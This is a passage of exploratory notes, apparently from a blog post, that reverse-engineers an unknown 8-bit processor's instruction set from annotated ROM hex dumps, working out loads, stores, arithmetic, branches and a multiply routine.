+    52e8ec76edbfdee6e876ed9805e401bc52e8b928c806eec805eec847eee8
+    03f3619016e003c84beee001c84aeee140e8a3f919c8a3f9bc3b60e102e8
+    4aee799026e003c84beee8eded9805e008c803f3e008c88cf971e898f919
+    c898f9e1bfe8a3f921c8a3f9b9e010c803f3bf9f5ce108e898f919c898f9
+    e1bfe8a3f921c8a3f9e001c846ee
+    b9
+
+reconsidering other lines, there's this from early on which is not obviously 
+wrong but now clearly has an error:
+
+  79 9009 fe07 72 fe08 73 e015 d216 74 17 75 bfead9 bc3bdb 16 74 17 75 bfe605
+        ^                        ^
+        $+9 is an instruction    is $+9, the split was wrong
+
+so this should be
+
+79 9009 fe07 72 fe08 73 e015 d2 16 74 17 75 bfead9 bc3bdb 16 74 17 75 bfe605
+      ^                         ^
+      $+9 is an instruction     is $+9d
+
+16 is an instruction on its own, and so is d2.
+
+back to looking for interesting structures, and here's part of a larger 
+function:
+
+    e108
+    e8d5ee
+    79 9113
+      e1f8 51 72 e8d6ee e100
+      9802          ; jump forward to 42..
+        50 31 42
+      99fb          ; jump backwards to 50..
+      bc45eb
+    e9d5ee e008 59 49 71 e8d6ee bc40eb 69 38 41 99fb e100 76 11 77 e9d7ee
+    16 79 e9d8ee 17 49
+    9959
+
+so there's a short loop, the loop's body is 50 31 42, and some condition 
+means the loop is entered skipping 50 31.
+
+different topic for a moment, there are lots of e8XXXX/c8XXXX. what's going 
+on with that? something to orient with...
+
+    87 86
+    28
+    c8f4b0
+    bf03bd
+    e013 c820b5
+    e0ec c81fb5
+    bfbfe6
+    e0ce c8c2b4
+    e0af c8c1b4
+    e434 bf8f4d
+    71 9003
+      bc87c0
+    e83bb5 c807ee ; the immediates here are interesting actually
+    e83cb5 c808ee ; incrementing by 1
+    e83db5 c809ee ; on the first and second instruction
+    e83eb5 c80aee ; 0xb53e, 0xee0a ?
+    bf2fd6
+    bfdcdb
+    bfc62e
+    e101 799803bc38c0e803f3609809e841b6e942b6
+
+--[ loads and stores!!
+
+e8 XXXX is probably a load! then c8 XXXX is a store! might be an absolute 
+16b address then? does that suggest e0 is a relative load? maybe some kind 
+of banked load.
+
+seems like c9 is also a store, probably all c8-cf and e8-ef are store/load?
+
+    bf8ac0 e1fe e850f3 21 c850f3
+    b9 28 c8feed c8fded 72 e449 bcc2d4
+    e829b4 c863ef                ; another 32b copy
+    e828b4 c862ef
+    e825b4 c865ef
+    e824b4 c864ef
+    e200 e400
+    bf83e9
+    c9f2ed c8f1ed e8f1ed e9f2ed  ; [edf2]->r1; [edf1]->r0; 
+                                 ; r0->[edf1]; r1->[edf2]? this is wrong
+    bc8ad9
+    e40e
+    bf4204
+    c929b4 c828b4                ; again, storing and then loading later?
+    e00d
+    ea28b4 eb29b4                ; but ea/eb would be r4, r5 maybe
+
+elsewhere is another interesting sequence, annotating by the theory so far,
+
+    e1bf    ; r1<-[...0xbf]
+    e823f2  ; r0<-[0xf223]
+    21      ; ???
+    c823f2  ; [0xf223]<-r0
+
+this is great: control flow, loads/stores, this is enough to start finding 
+where registers are read and written, and start figuring out arithmetic or 
+other operations.
+
+--[ it does, in fact, have an ALU
+
+so 21 is maybe, op r0, r1? 21 can't encode two registers (would be 
+001y yzzz? not enough space to say r4, r5 here). so might be an implicit r0.
+
+28 is a different op2 r0, r0? consider
+
+    e803f3    ; r0<-[0xf303]
+    60 9009   ; also 60: generates a status from r0?
+      28      ; definitely an instruction
+      c83dee  ; [0xee3d]<-r0
+      e001    ; r0<-[..0x01]
+      c85aed  ; [0xed5a]<-r0
+    
+      bfd547
+      71
+    98fa
+
+28 might be xor r0, r0, it's often precedes a c8 store:
+
+    87 86
+    28 c8f4b0         ; xor r0, r0 (?); [0xb0f4]<-r0
+    bf03bd
+    e013 c820b5
+    ... ...
+    b9                ; ret
+    28                ; first instruction in the block? function?
+    c8feed c8fded     ; [0xedfe]<-r0; [0xedfd]<-r0
+    72 e449 bcc2d4    ; op r0, r2; r4<-[..0x49]; ??
+    e829b4 c863ef
+    e828b4 c862ef
+    e825b4 c865ef
+    e824b4 c864ef
+
+78 is not present as an instruction it seems, 79 is?
+
+    bfc62e    ; unknown
+    e101      ; r1<-[..0x01]
+    79 9803   ; op r0, r1?; jCC $+3
+      bc38c0  ; unknown
+    e803f3    ; r0<-[0xf303]
+
+7a is a single-byte instruction, as is 74 and b4:
+
+    29 4c 912d
+      ea5bed eb5ced  ; r2<-[0xed5b]; r3<-[0xed5c]
+      e048 e120      ; r0<-[..0x48]; r1<-[..0x20]
+      7a e080 2b     ; 28 seems like xor r0, r0, so 2b is xor r0, r3?
+      74 e080 29     ; 29 as xor r0, r1?
+      4c 9118
+        e850f1
+        64 9012
+          bf2bd7
+          28 c810f2 c885f2 c884f2
+          74 75 bf03d7
+    bfc62e e101
+    79 981b
+      e10f e8b0b4
+      79 9009
+        e8b1 b4 62 9803 61 900a
+
+fishing around to find more about the 1X and 2X opcodes, this region is
+interesting:
+
+    62 9811
+      e108 e854f1      ; r1<-[..0x08]; r0<-[0xf154]
+      19               ; op r0, r1? ;
+      c854f1           ; [0xf154]<-r0; maybe 0001_1xxx is add?
+      e852f1           ; r0<-[0xf152]
+      60               ; something on r0 producing a condition..
+      9802
+        e600           ; 1110_0xxx yyyyyyyy may be "load imm8 into rX"
+    16                 ;
+    74 bf67c5
+                       ; the sequence here is eventful
+    e18f               ; r1<-0x8f
+    e825f2             ; r0<-[0xf225]
+    21                 ; op r0, r1
+    e170               ; r1<-0x70
+    19                 ; op r0, r1
+    c825f2             ; [0xf225]<-r0
+    e008 c803f3 bf52d8
+    28 c8e6ed c8eeed
+
+some evidence that 21 may be the and instruction in particular, rather than 
+add or sub:
+
+    e1bf      ; r1<-0xbf
+    e823f2    ; r0<-[0xf223]
+    21        ; op r0, r1     
+              ; if op were add, presumably there is a sub, why not sub 0x40?
+    c823f2    ; [0xf223]<-r0  ; and masks bits, makes somewhat more sense...
+
+`0xbf` as an immediate to `and` selects bits `1011_1111`. if this were `add`, 
+though, it would be an increment by 191 (not common) or a roundabout subtract 
+by 65 (perhaps less common?). so, `and` it is!
+
+is 78..7f is cmp/test/sub r0, rN:
+
+    e812b1 e913b1 ea14b1 eb15b1
+    ecfcee
+    7c 9012           ; is [0xeefc] == [0xb112]?
+      e8fdee
+      79 900c         ; is [0xeefd] == [0xb113]?
+        e8feee
+        7a 9006       ; is [0xeefe] == [0xb114]?
+          e8ffee
+          7b 9803     ; is [0xeeff] == [0xb115]?
+            bf420b
+    e80db1 e90eb1 ea0fb1 eb10b1
+    ec05ef
+    7c 9012           ; is the same for [0xb10d..0xb110] == [0xef05..0xef08]
+      e806ef
+      79 900c
+        e807ef
+        7a 9006
+          e808ef
+          7b 9803
+            bf420b
+    8e b9
+
+notably 78 does not seem to appear as an instruction. preference for 
+xor r0, r0 (0x28)? or not sub?
+
+at this point it's starting to be especially important to figure out which 
+operands an instruction reads or writes its operands, ones that are explicit 
+and can change instruction to instruction. spans like the following can help 
+make sense of what instructions feed data into ones that come later. trying it 
+on for size, it seems like [10..17] might be mov rX, r0, and maybe 
+[70..77] are sub r0, rN?
+
+    87 86             ; push r7; push r6
+    14 76 15 77 f698  ; mov r4, r0 ?; sub r0, r6 ?; mov r5, r0 ?; sub r0, r7 ?
+    19 e0f2 c8ecee    ; add r0, r1 ?; r0<-0xf2; r0->[0xeeec]
+    17                ; mov r7, r0 ?; this is especially interesting..
+    71                ; maybe this subtracts from r1? or subtracts into r1?
+    16                ; mov r6, r0 ?
+    c0                ; ???
+    c9eeee            ; why it would modify from r1, `[0xeeee]<-r1`
+    c8edee            ; and `[0xeeed]<-r0`
+    e1ff f651
+    72 e412 bf4bd4
+    8e 8f b9
+
+taking this very carefully: the function definitely wants to presersve r7 and 
+r6, so they are likely written here. something happens with r4 and r5? 
+but the 17 after storing to [0xeeec] is really useful! of the few 
+instructions between it and the 77 before it, none seem likely to interact 
+with r7: 
+
+* f698 - least known, but still unlikely to reference the 7th anything
+* 19 - low instructions seem to be like XXXXX_YYY, so this is "op r1, r0"?
+* e0f2 - pretty confident this only writes to r0
+* c8ecee - pretty confident this only reads `r0` and writes to memory
+
+so what's the point of 77 then, using register 7? if 17 reads register 7, then 
+77 probably wrote it. if 17 writes register 7, then 77 is probably a read - if 
+it was a write then it seems like it would be clobbered later unless one of 
+these instructions uses r7 implicitly.
+
+worse: 77 is probably not writing to r0, so the initial guess of sub r0, r7 
+seems to really not fit. 19 probably modifies r0, from looking at other blocks 
+above, and its clobbered by e0f2 loading f2 into r0 anyway. all that really 
+seems to remain is that 77 probably reads r0 and probably writes r7, then that 
+76 does similar but to r6.
+
+at this point it seems best to move on and chip at this block later. 19 above 
+is a mystery; what does it mean here?
+
+    c83bef      ; [0xef3b]<-r0
+    c93cef      ; [0xef3c]<-r1
+    ca3def      ; [0xef3d]<-r2
+    cb3eef      ; [0xef3e]<-r3
+    e825ee      ; r0<-[0xee25]
+    e93bef      ; r1<-[0xef3b]
+    19 c825ee   ; op r0, r1; [0xee25]<-r0 ; 18..1f is likely not add, sub, 
+                ;  could be adc/sbc, maybe `or`
+    e826ee      ; r0<-[0xee26]
+    e93cef      ; r0<-[0xef3c]
+    19 c826ee   ; op r0, r1; [0xee26]<-r0 ; if 19 is `or`, this is computing 
+                ;  OR of two 32 regions
+    e827ee      ; r0<-[0xee27]
+    e93def      ; r1<-[0xef3d]
+    19 c827ee   ; op r0, r1; [0xee27]<-r0
+    e828ee      ; r0<-[0xee28]
+    e93eef      ; r1<-[0xef3f]
+    19 c828ee   ; op r0, r1; [0xee28]<-r0
+    ea3bef      ; r2<-[0xef3b]            ; then .. something?
+    eb3cef      ; r3<-[0xef3c]
+    ec3def      ; r4<-[0xef3d]
+    ed3eef      ; r5<-[0xef3e]
+    80 e837ef   ; op; r0<-[0xef37]
+    2280        ; op r0, r2; op
+    e838ef      ; r0<-[0xef38]
+    2373        ; op r0, r3; op r0, r3
+    e839ef      ; r0<-[0xef39]
+    2474        ; op r0, r4; op r0, r4
+    e83aef      ; r0<-[0xef3a]
+    2575        ; op r0, r5; op r0, r5
+
+or this:
+
+    e876b4      ; r0<-[0xb476]
+    e977b4      ; r1<-[0xb476]
+    c8e6b0      ; [0xb0e6]<-r0
+    c9e7b0      ; [0xb0e7]<-r1
+    28 c8e8b0   ; [0xb0e8]<-0
+    c8e9b0      ; [0xb0e9]<-0
+    72 73
+    e9d8ee      ; r1<-[0xeed8]
+    e8d7ee      ; r0<-[0xeed7]
+    bff5ec      ; ?
+    ecd5ee      ; r4<-[0xeed5]
+    bc63ea
+                ; so this loop is... 
+                ;  do { X r1, X r3, X r2, X r1, X r0, X r4 } while cond(r4) ?
+      69 3b 3a 39 38 44
+    99f8
+    ecd3ee 5474 e8d4ee 097114
+    c999b4
+    c898b4
+    e8daee
+    c877b4
+    e8d9ee
+    c876b4
+
+18..1f seem like r0 |= rX:
+
+    e835ef e932ef 19 e933ef 19 e934ef 19
+    9019
+
+where 19 would mean this ORs all four bytes and checks for.. zero? non-zero?
+
+--[ inc and dec are a loop's best friend
+
+and maybe 4X is dec? shr? 40 agrees, here's a branch table or smth?
+
+    9814
+      11 19
+      9810
+        40 98b6
+        40 98ba
+        40 98d8
+        40 98db
+        40 98df
+        40
+    bf57d0 bfbfcf
+
+seems like 40 is dec r0, consider this loop:
+
+      e103
+      e87fb4
+      21              ; op r1
+      74              ; op r4
+      e500            ; r5<-0x00
+      e00b            ; r0<-0x0b
+    loop:
+        69 34 35 40   ; op r1?; op? r4; op? r5; dec r1
+      90 fa           ; jnz loop
+
+so 0100_0XXX seems like dec rN. 0011_0XXX may be inc rN? and what is 0x69.
+
+some more about the low 7Xs:
+
+    86
+    14 76 e8e2ed  ; r4->r0? ; ...??? r6; r0<-[0xede2] .. 
+                  ;  maybe 76 is xchg r0, r6?
+    7e 9817       ; 7e is maybe "compare r0 and r6"; jz?
+      e003 c858ef e0ff c859ef ce5aefe458e5efbfded6cee2ed
+    8e b9
+
+since other ops seem oriented around operations on r0 and modifying r0, the 
+low 7x's might be moving from r0 to a different register? in contrast to low 
+1x which move into r0. for example in the partially-disassembled snippet,
+
+    r1 <- 0x04
+    r0 <- r2
+    r0 |= r1
+    op7x.lo r0, r2
+    r0 <- 0x32
+    [0xf029] <- r0
+
+it's loaded r0, modified it, and would clobber it after the unknown op. 
+op7x.lo must at least read r0 and write r2 or other state. there aren't 
+any other instructions to read flags or anything before the next op7x.lo,
+
+    r1 <- 0x10
+    r0 <- r2
+    r0 |= r1
+    op7x.lo r0, r2
+
+so it could be an add/sub to store back into r2, but the or wouldn't make 
+sense. if the r0 is the only register that can be modified by arithmetic 
+instructions - instructions seem small so there's not much encoding space 
+- then modifying a value would look like "copy to r0, modify, copy back".
+
+meanwhile 78..7f is probably a cmp (rather than sub): in a sequence like
+
+      r1 <- 0x03
+      r0 <- [0xb475]
+      op7xhi r0, r1   ; byte 0x79
+      jcc.lo.0 $+0x10 ; bytes 9010, destination `dest`
+      r1 <- 0x04
+      r0 <- [0xeed2]
+      op7xhi r0, r1
+      jcc.hi.0 $+0x08
+      r0 <- 0x03
+      [0xeed2] <- r0
+      op.bc ec2c
+    dest:
+      r1 <- 0x03
+
+so if op7xhi r0, r1 modified the destination, that modification is clobbered. 
+it generates flags (consumed by jcc.lo.0). 79 is a very common prefix to 90xx 
+or 98xx branches, but uncommon to stand alone.
+
+counterpoint though, sequences like
+
+    e100            ; r1 <- 0x00
+    bfecac          ; unknown
+    c9dfee c8deee   ; [0xeedf] <- r1; [0xeede] <- r0
+    e8eded 902f     ; r0 <- [0xeded]; jcc $+0x2f?
+
+have a useful branching condition with only loads (barring bfecac generating 
+a status). and even if bfecac did generate a status, the next code if this 
+is taken would be
+
+    e8e8ed 9841     ; r0 <- [0xede8]; jcc $+0x41
+
+so either the e8 load is enough to generate a status or the 98 branch is 
+fully determined from the earlier bfecac. it's possible; the branches could 
+be a pair like jnz and ja, where there is a third reasonable condition (jb) 
+that becomes the implicit third outcome. but in that case why e8e8ed before 
+the branch?
+
+so perhaps the 90/98 conditions are predicated fully on the contents of r0?
+
+ah, still unsure about bf, but this seems useful:
+
+    86
+    14 76 e8e2ed
+    7e 9817
+      e003 c858ef   ; [0xef58] <- 0
+      e0ff
+      c859ef ce5aef ; [0xef59] <- 0; [0xef5a] <- 0xff
+      e458          ; r4 <- 0x58
+      e5ef          ; r5 <- 0xef ; so r5 and r4 together hold `ef58`, 
+                    ;  just assigned
+      bfded6        ; consumes r4, r5, writes r6?
+      cee2ed        ; [0xed2e] <- r6
+    8e b9
+
+--[ more subtle loads or stores?
+
+distracted by fe01. found this:
+
+    87 86       ; push r7; push r6
+    28 c83df3   ; xor r0, r0; [0xf33d] <- r0
+    e00a c83cf3 ; r0 <- 0x0a; [0xf33c] <- r0
+    28 c8c2ee   ; xor r0, r0; [0xeec2] <- r0
+    e6ca e7ee   ; r6<-ca; r7<-ee ; r7:r6 = 0xeeca
+    fe02 c837f3 ; fe02 ; [0xf337] <- r0
+    fe01 c836f3 ; fe01 ; [0xf336] <- r0
+    fe03 c838f3 ; fe03 ; [0xf338] <- r0
+    fe04 c839f3 ; fe04 ; [0xf339] <- r0
+    fe05 c83af3 ; fe05 ; [0xf33a] <- r0
+    fe06 c83bf3 ; fe06 ; [0xf33b] <- r0
+    f6 9827     ;
+
+so fe0X writes to r0. before feXX are issued, r6 and r7 are often loaded 
+with values that are also similar to nearby pointer values. so r7:r6 
+usually forms a valid pointer. fe00 does not exist in the image. is there 
+a shorter instruction for a load of [r7:r6 + 0]?
+
+separately, looks like deXX is store r0 to [r7:r6 + XX]. consider this code:
+
+    87 86                   ; push r7; push r6
+    ca40ef cc41ef           ; [0xef40] <- r2; [0xef41] <- r4
+    e412 bf14e9 76 11 77    ; r4 <- 0x12; call? ; r0->r6; r1->r0; r0->r7
+    e072                    ; r0 <- 0x72
+    de03                    ; hmm
+    e841ef de04             ; r0 <- [0xef41]; hmm
+    e840ef de05             ; r0 <- [0xef40]; hmm
+    e83eee de06             ; r0 <- [0xee3e]; hmm
+    e200 16 74 17 75 bf5f05 ; e2 <- 00; r6->r0; r0->r4; r7->r0; r0->r5; call?
+    8e 8f b9                ; pop r6; pop r7; ret
+
+so if the move of r1:r0 to r7:r6 is for a reason, that likely means: 
+
+  * the calling convention has pointers returned in r1:r0 
+  * deXX might use r7:r6?
+
+then between each deXX the program only loads r0 with an e8XXXX, so deXX 
+does not modify r0. if it modifies other registers, it's not r2 (clobbered 
+later), not r4, r5 (clobbered later). if it's an indirect store through 
+r7:r6 it doesn't seem to increment (if it does, this is a .... very strange 
+access pattern).
+
+most likely seems to be r0 -> [r7:r6 + imm8]. that seems like a plausible 
+function:
+
+    push r7; push r6;
+    [0xef40] <- r2; [0xef41] <- r4;
+    r4 <- 0x12; call 0xe914;
+    r1:r0 -> r7:r6                     ; grouped a few moves together for 
+                                       ;  this overall effect
+    r0 <- 0x72;     [r7:r6 + 3] <- r0
+    r0 <- [0xef41]; [r7:r6 + 4] <- r0
+    r0 <- [0xef40]; [r7:r6 + 5] <- r0
+    r0 <- [0xee3e]; [r7:r6 + 6] <- r0
+    r2 <- 0x00; r7:r6 -> r5:r4; call 0x055f ; eliding more movs
+    pop r6; pop r7;
+    ret
+
+and 18..1f is or! here's another region:
+
+    e400 bf4204   ; r4 <- 0x00; call
+    76 11 77      ; r1:r0 -> r7:r6 ; similar to before: 
+                  ;                   exact movs are r0->r6; r1->r0; r0->r7
+    71 16         ; r0 -> r1; r6 -> r0
+    19            ; unknown
+    9003          ; jcc $+3
+      bf420b      ; call
+    e0ff de03     ; r0 <- 0xff; [r7:r6 + 3] <- r0
+    28 de04       ; xor r0, r0; [r7:r6 + 4] <- r0
+    e005 de05     ; r0 <- 0x05; [r7:r6 + 5] <- r0
+    28 de06       ; xor r0, r0; [r7:r6 + 6] <- r0
+
+bf4204 returned a pointer that would be used in de03 and later, below. 
+before it is used there though, 71 16 19 does something with the two bytes 
+of pointer before conditionally calling(?) something(?). there aren't many 
+useful operations on the two bytes.
+
+it's probably or, meaning 71 16 19 forms a null check, and there are likely 
+other hits for that sequence... there are seven. four have the condition 
+branch over a bf420b, so maybe 0xb42 is a fault handler? reset? some kind 
+of trap. it probably doesn't return here since i'm certain that r7:r6 is 
+not useful for writing anyway.
+
+also, that tells us 90 is jnz. 98 then is probably jz. that's consistent 
+with sequences from earlier, like
+
+    11 19 9810  ; r0 <- r1; r0 |= r1  ; jz $+10
+    40 98b6     ; dec r0              ; jz $-0x4a
+    40 98ba     ; dec r0              ; jz $-0x46
+    40 98d8     ; dec r0              ; jz $-0x28
+    40 98db     ; dec r0              ; jz $-0x25
+    40 98df     ; dec r0              ; jz $-0x21
+
+implementing a branch table for i in 0..5?
+
+--[ a multiplier!
+
+69 and 38..3f make more sense from this loop:
+
+    28 c8e8b0 c8e9b0    ; xor r0, r0; [0xb0e8] <- r0; [0xb0e9] <- r0;
+    72 73               ; r0 -> r2; r0 -> r3
+    e9d8ee e8d7ee       ; r1:r0 <- [0xeed7:0xeed8]
+    bff5ec              ; call
+    ecd5ee              ; r4 <- [0xee5d]
+    bc63ea              ; dunno
+      69 3b 3a 39 38 44 ;  ??? but r3, r2, r1, r0, then dec r4
+    99f8                ; conditional branch to ???
+
+so for each of 3b..38 it operates on rN, maybe r0. but if it accumulates 
+into r0, why loop r4 times? if 3b mutates only r3, then there are few 
+operations that make sense for all four registers: 
+
+  * not adc/sbc (add/sub X to each byte?) 
+  * could be ror/rol (operates on each byte independently) 
+  * rcr could be it, high bytes carry into lower 
+  * rcl could be it if endianness were such that the value is r0:r1:r2:r3 
+  * since it only rotates by one bit it may actually be called a shift 
+    through carry?
+
+if it's rcr/rcl then 69 clears the carry flag between loops so the loop 
+implements a shift rather than rotate.
+
+assuming 38..3f is rcr since r3:r2:r1:r0 matches endianness seen elsewhere.
+
+seems like fa is similar to fe, but loading through r3:r2 instead of r7:r6.
+
+    fe07 72 fe08 73      ; [r7:r6 + 7..8] -> r3:r2
+    fa03 c872ed          ; fa03; store [0xed72]
+    fa02 c871ed          ; fa02; store [0xed71]
+    fe07 72 fe08 73 e004 d2 bceacc
+    fe07 72 fe08 73      ; [r7:r6 + 7..8] -> r3:r2
+    e873ed da02          ; load [0xed73]; da02
+    fe07 72 fe08 73      ; [r7:r6 + 7..8] -> r3:r2
+    e875ed da04          ; load [0xed75]; da04
+    e874ed da03          ; load [0xed74]; da03
+
+fa might clobber r3:r2? again if it was "load and increment" or "store and 
+increment" then the immediate offsets are very odd. maybe the repeated loads 
+of r3:r2 are redundant?
+
+also from this, da looks similar to de: store r0 to [r3:r2 + XX].
+
+21 might be and r0, r1? r1 seem to often have some immediate consecutive 
+bitmasky thing loaded shortly before 21. same for 22. check this out:
+
+    f2 74
+    e001 e100 e200 e300 ; r3:r2:r1:r0 <- 0
+    9804                ; ???
+      50 31 32 33       ; op ?r0?; op r1, op r2, op r3 - maybe
+                        ; ` r0; rcl r1; rcl r2; rcl r3
+    
+      44                ; dec r4
+    99f9                ; conditional loop
+    ec2eef 24 80        ; load r4; op r4; push r0
+    e82fef 21 71        ; load r0; op r2; r0->r1
+    e830ef 22 72        ; load r0; op r2; r0->r2
+    e831ef 23 73        ; load r0; op r3; r0->r3
+    88                  ; pop r0
+    c832ef c933ef ca34ef cb35ef ; store r3:r0 -> [0xef32:0xef35]
+
+looks like the loop is building up a 32b bitmask, anding, then storing back?
+
+ok, different function:
+
+      e408                ; r4 <- 8
+    back:
+        69 3d               ; ccf; rcr r5
+        911d                ; jcc.lo.1 forward
+    back:
+    
+          e8eab0 56 c8eab0  ; r0 <- [0xb0ea]; op5x r0, r6; [0xb0ea] <- r0
+          e8ebb0 09 c8ebb0  ; r0 <- [0xb0eb]; op0x r0, r1; [0xb0eb] <- r0
+          e8ecb0 0a c8ecb0  ; r0 <- [0xb0ec]; op0x r0, r2; [0xb0ec] <- r0
+          e8edb0 0b c8edb0  ; r0 <- [0xb0ed]; op0x r0, r3; [0xb0ed] <- r0
+    
+          69                ; ccf
+    forward:
+        36 31 32 33 44    ; something on r6, r1, r2, r3; dec r4
+      90d8                ; jnz back
+      b9                  ; ret
+
+first observation: 91 is probably jnc. if it's jc then the loop would be 
+entered with a carry flag set ... only on the first iteration. it seems 
+more likely this is relying on knowing cf is unset to not execute ccf 
+needlessly at the jump target. compared with other codegen, maybe this 
+is a hand-written intrinsic?
+
+second observation: 30..37 might be rcl? whatever 56 .. 09 .. 0a .. 0b does, 
+the surrounding load/stores suggest that there's a 32b value in r3:r2:r1:r6. 
+meanwhile, the loop operates on r6:r1:r2:r3. each op would then carry out to 
+the next most significant byte, and this is similar to rcr already known to 
+be 38..3f.
+
+then if 30..37 is rcl, the loop implements <u32> << 8. why is TBD, but it 
+seems like a plausible high-level behavior.
+
+elsewhere, this helps explain 50:
+
+    f6 74                         ; ; r0 -> r4
+    e001 e100 e200 e300           ; r3:r2:r1:r0 <- 00_00_00_01
+    9804                          ; jcc $+4
+      50 31 32 33                 ; ; rcl r1; rcl r2; rcl r3
+    
+      44                          ; dec r4
+    99f9                          ; jcc $-7
+    c83bef c93cef ca3def cb3eef   ; [0xef3b:0xef3e] <- r3:r2:r1:r0
+
+if 50 were add r0, r0, this implements 1u32 << r4 - add r0, r0 is 
+functionally the same as shifting r0 left by 1 with highest bit carried 
+out. it seems unlikely to be adc, because in other places 50 is used it 
+seems that cf is indeterminate.
+
+this region also reinforces that 99 is jnc. if 99 were jc the loop would be 
+taken at most once, but as jnc it is taken until r4 == 0.
+
+this in turn helps explain 08..0f:
+
+    e408                    ; r4 <- 8
+    bit:
+      69 3d 911d            ; ccf; rcr r5; jc clear
+        e8eab0 56 c8eab0    ; add [0xb0ea], r6 
+                            ;  (taking creative liberties with the isa)
+        e8ebb0 09 c8ebb0    ; op [0xb0eb], r1
+        e8ecb0 0a c8ecb0    ; op [0xb0ec], r2
+        e8edb0 0b c8edb0    ; op [0xb0ed], r3
+    
+    clear:
+      69 36 31 32 33 44     ; ccf; rcl r6:r1:r2:r3; dec r4
+    90d8                    ; jnz bit
+    b9                      ; ret
+
+so... this would be a 32b by 8b multiply.. but only if op is adc. for each 
+set bit in r5, add r6:r1:r2:r3 into 0xb0ea. shift r6:r1:r2:r3 left 1 
+regardless of bit being set in r5. repeat 8 times for each bit in r5.
+
+... that said, the calling convention for this is different from every other 
+function, and is moderately unhinged: why is r4 unused? why is r0 unused? 
+why is r6 used??? either way. 08..0f is adc.
+
+but this function is weird enough to try figuring that out sooner than later. 
+looking for the memory address referenced here, 0xb0ea there's this region 
+i'd looked at very early on that seems relevant:
+
+    c870ef c971ef
+    e878b4 e979b4 ec70ef 59 4c 74 11 e971ef 49 71 14 c977b4
+    c876b4 28 c8beb9 e0ea c8c0b9 e00d c8bfb9 e201 e405 bcc632 e105 e875b4
+    79 9004
+      28 c8d2ee
+    b98485 86 e600        ; something; push r6; r6 <- 0
+    ceeab0                ; [0xb0ea] <- 0
+    ceebb0                ; [0xb0eb] <- 0
+    ceecb0                ; [0xb0ec] <- 0
+    ceedb0                ; [0xb0ed] <- 0
+    76 ede6b0             ; r0 -> r6 ; r5 <- [0xb0e6]
+    bf 2f                 ; op; op
+    ed ed e7b0bf 2f       ; ??
+    ed ed e8b0bf 2f       ; ??
+    ed ed e9b0bf 2f       ; ??
+    ed                    ; ??
+    e8eab0                ; [0xb0ea:0xbeed] <- r3:r2:r1:r0
+    e9ebb0
+    eaecb0
+    ebedb0
+    8e 8d 8c b9
+
+but the whole thing in the middle is nonsense. taking a much closer look, 
+though, this was before i'd learned... many things about the instruction set. 
+first, on line 6 the first instruction is not b98485! it is just b9 - ret. 
+so this region is actually the end of one function and start of the next. 
+84 85 86 are pushes in the prologue of the real function of interest.
+
+additionally, bf is not a standalone instruction, it takes two bytes as an 
+immediate to call. and ed is not an instruction on its own, it is 
+r5 <- [imm16]. so lets delineate that correctly...
+
+    84 85 86 e600         ; push r4; push r5; push r6; r6 <- 0
+    ceeab0                ; [0xb0ea] <- 0
+    ceebb0                ; [0xb0eb] <- 0
+    ceecb0                ; [0xb0ec] <- 0
+    ceedb0                ; [0xb0ed] <- 0
+    76                    ; r0 -> r6
+    ede6b0 bf2fed         ; r5 <- [0xb0e6]; call 32x8b multiply?
+    ede7b0 bf2fed         ; r5 <- [0xb0e7]; call 32x8b multiply?
+    ede8b0 bf2fed         ; r5 <- [0xb0e8]; call 32x8b multiply?
+    ede9b0 bf2fed         ; r5 <- [0xb0e9]; call 32x8b multiply?
+    e8eab0                ; [0xb0ea:0xbeed] <- r3:r2:r1:r0
+    e9ebb0
+    eaecb0
+    ebedb0
+    8e 8d 8c b9
+
+and so here we are: this function implements a 32b x 32 multiply of the 
+integers in b0ea:b0ed and b0e6:b0e9, storing the result in b0ea:b0ed. 
+notable mention to r0, which happens to be the low byte of the last round 
+of multiplication, so the e8eab0: [0xb0ea] <- r0 is in fact correctly 
+storing the low byte of this whole thing to the output region. 
+
+notable mention, too, to 76: r0 -> r6, because by leaving r0 free for 
+clobber the inner multiply routine does not need to move the r0 argument 
+elsewhere to free r0 for use in add/adc. and loads from memory are no more 
+expensive (in terms of code size) when loading to an alternate register, 
+so it's simple enough to load directly to r6 for the to-multiply byte of 
+reach step.
+
+--[ what's left?
+
+OK. this is great progress so far. many instructions make sense, composition 
+of those instructions seems reasonable. the only remaining encoding regions 
+that are unknown are: 
+
+  * 00..07 
+  * 48..4f 
+  * 58..5f 
+  * 60..6f, except 69 (ccf) 
+  * 78..7f: might be cmp, might be sub. need evidence one way or the other! 
+  * a0..af, seems not-present 
+  * b0..b7, seems not-present, except b4 
+  * b8..bf, except b9, bc (maybe jump?), bf 
+  * c0..c7, which is remarkably rare 
+  * d0..df, except da, de. seen but not understood: db, dc 
+  * f0..ff, except fa, fe. seen but not understood: f0, f2, f3, f4, f6
+
+and as a bonus, knowing the relationship of the last two functions i'd 
+looked at, i know the base address of this rom (finally!!): the inner 
+multiply routine starts at 0xedf2, so the first byte of this image is 
+at address 0xed2f (mapped) - 0x31c3 (file) == 0xbb5c.
+
+here's a theory for d2, d4, d6, as well as e2, e4, e6: like their d<high> 
+counterparts but with no immediate offset. that is, d4 is [r5:r4] <- r0? 
+here's a hex region to help inform this theory:
+
+      900d              ; jcc later
+        ea15ee eb16ee   ; r4<-[0xee15]; r5<-[0xee16]
+        fa01 dc01       ; r0<-[r3:r2+1]; [r5:r4+1]<-r0
+        f2 d4           ; ?? ??
+        b9              ; ret
+    
+    later:
+      ea15ee eb16ee     ; r4<-[0xee15]; r5<-[0xee16]
+      fa03 dc01         ; r0<-[r3:r2+3]; [r5:r4+1]<-r0
+      fa02 d4           ; r0<-[r3:r2+2]; ??
+      b9                ; ret
+
+so, this seems like a conditional branch to move 16b from one part of a 
+struct or another, to a single destination location. d4 probably stores 
+the lower byte being copied, evidenced by fa02 to load it in the later 
+branch. then f2 is probably a load of the lower byte, to store it in the 
+earlier case. there is no dc00 or fa00 or similar.... probably because 
+for offset-by-zero cases, there are these shorter instructions for the 
+same outcome. this happens to make for a neat pattern as well for opcodes 
+like 0b11x1_iNNN:
+
+  * x picks between "load" and "store" - this is the difference between 
+    0xde and 0xfe
+
+  * i picks between offset 0 and offset imm8 - this is the difference 
+    between 0xd4 and 0xdc
+
+  * NNN picks which register pair to indirect through - d2 uses r3:r2, 
+    d4 uses r5:r4, d6 uses r7:r6
+
+and so this opens more questions than it answers! what happens if NNN an 
+odd register? can this machine indirect through a register pair like r4:r3? 
+why is the pair r1:r0 never used? what about r7:r6? in fact rEven:rOdd seems 
+never used, are those instructions entirely different?
+
+... [ week long pause here. Destiny 2: The Final Shape launched, and 
+      everything else ground to a halt ] ...
+
